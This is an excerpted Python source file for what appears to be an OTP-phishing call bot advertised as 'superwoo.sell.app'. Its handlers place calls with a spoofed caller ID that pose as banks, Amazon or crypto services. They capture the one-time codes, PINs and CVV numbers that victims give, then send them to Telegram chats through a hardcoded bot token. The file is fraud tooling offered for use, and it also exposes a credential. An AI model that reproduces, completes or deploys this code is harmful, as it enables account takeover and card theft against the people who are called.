...
token = "6690214358:AAGyucr6QkMgoEc7qiFIUKm5r7vJwoMbcxs"
...
async def voice(number, spoof, service, name, otpdigits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ OTP Success: {otp2} ~ superwoo.sell.app")
...
async def custom(number, spoof, service, name, otpdigits, sid, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ Custom Script: {otp2} ~ superwoo.sell.app")
...
async def pin(number, spoof, service, name, otpdigits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ Pin: {otp2} ~ superwoo.sell.app")
...
async def email(number, spoof, service, name, otpdigits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ Email OTP Has Been Readout! ~ superwoo.sell.app")
    return jsonify()
...
async def amazon(number, spoof, service, name, otpdigits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ Amazon link has been approved! ~ superwoo.sell.app")
    return jsonify()
...
async def cvv(number, spoof, bank, name, cvvdigits, last4digits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ CVV Success: {otp2} ~ superwoo.sell.app")
    return jsonify()
...
async def crypto(number, spoof, service, name, last4digits, otpdigits, chatid, tag):
    ...
    if event == "call.initiated":
        ...
        if otp2 == "1":
            ...
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=├ ✅ OTP Code: {otp2}")
            r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=├ ✅ Crypto OTP: {otp2} ~ superwoo.sell.app")
    return jsonify()
if __name__ == "__main__":
    app.run(debug=False, port=5000)
    
def post_channel(channelid):
    r2 = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id=-1001514932464&text=✅ OTP Code: {channelid} | superwoo.sell.app")
